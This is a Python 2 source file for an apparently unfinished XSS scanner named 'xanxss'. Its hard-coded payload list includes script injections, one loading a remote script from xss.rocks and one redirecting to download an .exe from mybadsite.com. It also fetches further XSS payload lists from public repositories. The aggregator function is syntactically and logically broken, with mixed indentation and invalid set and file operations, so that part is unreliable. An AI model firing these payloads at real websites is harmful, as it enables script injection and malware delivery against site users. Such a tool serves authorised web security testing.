import os
import re
import sys
import urllib
import platform
import importlib
import random

VERSION = "0.3"
BANNER = """\033[95m
    ____  ___             ____  ___  _________ _________  \033[0m\033[96m
    \   \/  /____    ____ \   \/  / /   _____//   _____/
    \033[0m\033[95m \     /\__  \  /    \ \     /  \_____  \ \_____  \ \033[0m\033[96m
     /     \ / __ \|   |  \/     \  /        \/        \\
  \033[0m\033[95m  /___/\  (____  /___|  /___/\  \/_______  /_______  / \033[0m\033[96m
          \_/    \/     \/      \_/        \/        \/ 
    v({})\033[0m\n\n""".format(VERSION)
HEADERS = {
    "Connection": "close",
    "User-Agent": "xanxss/v{} (Language={}; Platform={})".format(
        VERSION, sys.version.split(" ")[0], platform.platform().split(" ")[0]
    )
}

# Just adding this here if you want to be able to set User Agent to one of an existing browser.
'''
def select_UA():
	UAs = ["'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'",
		   "'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'",
		   "'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'",
		   "'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'",
		   "'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'",
		   "'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12'",
		   "'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36'",
		   "'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36'",
		   "'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36'",
		   "'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0'"
		   ]
return random.choice(tuple(UAs))
'''    

PAYLOADS = [
    "<script src='http://xss.rocks/xss.js'></script>",
    "<img src='javascript:alert(\"XSS\");'>",
    "<script>alert(1);</script>",
    "<b onmouseover=window.location='https://mybadsite.com/download.php?item=pumpedupkicks.exe'>click me!</b>",
    '<iframe src="javascript:prompt(1)">',
    "<xanxss></xanxss>"
    ]


AGGREGATE_SOURCES = [
    "https://gist.githubusercontent.com/NullArray/599b26856ce40e79ba24e0e6f1dccc5e/raw/550c97f21f7f9fa2a59de99f9d6706b710dbd7f0/payloads.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS-RSNAKE.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS-JHADDIX.txt",
    "https://raw.githubusercontent.com/Pgaijin66/XSS-Payloads/master/payload.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS-BruteLogic.txt"
    ]

    
def aggregator(integer):
	sort_result = []
	full_list   = []
	
	for url in AGGREGATE_SOURCES:
		try:
		    urllib.urlretrieve(url, "tmp.txt")
		except Exception as e:
			print e	# Debug print
			
			continue			
			
	    try:
	        with open("tmp.txt", "rb") as infile:
		        infile.read_lines()
		        for line in infile:
			    full_list.append(line)
				    
			infile.close()
			os.remove(infile)    
		
		except Exception as e:
		    print e # Debug print
	
	if integer is not 0:		
	    for int in xrange(integer):
		    candidate = ""
		    candidate = random.choice(tuple(full_list))
		    if candidate.startswith("<META"): # remove once supported		
		        integer += 1
		        continue
            else:
                sort_result.append(candidate)
		
	    seen_set  = set()
        duplicate = set(x for x in sort_result if x in seen_set or seen_set.append(x))
	
        for items in duplicate:
	        try:
	           seen_set.remove(items)
		   except Exception as e:
		       continue
           finally:
               print e # Debug print
               pass 
	
	else:
	    for lines in full_list:
		    sort_result.append(lines)
	
        seen_set  = set()
        duplicate = set(x for x in sort_result if x in seen_set or seen_set.append(x))
	
        for items in duplicate:
            try:
                seen_set.remove(items)
            except Exception as e:
                continue
            finally:
                print e # Debug print
                pass  
	    
	    
	for payloads in seen_set:
		PAYLOADS.append(payloads)	
# Gonna need to do some debugging here probably  
			    
			    


def load_tampers():
    """
    load the tamper scripts into memory
    """
    script_path = "{}/tamper".format(os.getcwd())
    importter = "tamper.{}"
    skip_schema = ("__init__.py", ".pyc", "__")
    tmp = []
    retval = []
    file_list = [f for f in os.listdir(script_path) if not any(s in f for s in skip_schema)]
    for script in file_list:
        script = script[:-3]
        script = importlib.import_module(importter.format(script))
        tmp.append(script)
    for mod in tmp:
        current_priority = mod.__PRIORITY__
        if current_priority > 10:
            save = mod
        else:
            save = None
            retval.insert(current_priority, mod)
        retval.insert(-1, save)
    return retval


def prettify(working):
    """
    make output beautiful
    """
    seperator = "-" * 50
    print(seperator)
    for item in working:
        print("  ~~> {}".format(item))
    print(seperator)


def heuristics(url):
    query_regex = re.compile(r"(.*)[?|#](.*){1}\=(.*)")
    url_validation = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE
    )
    retval = {}
    if url_validation.match(url):
        retval["validated"] = True
    else:
        retval["validated"] = False
    if query_regex.search(url) is not None:
        retval["query"] = "ok"
    else:
        retval["query"] = "nogo"
    for c in url:
        if c == "*":
            retval["marker"] = "yes"
    if url.count("*") > 1:
        retval["multi_marker"] = True
    return retval
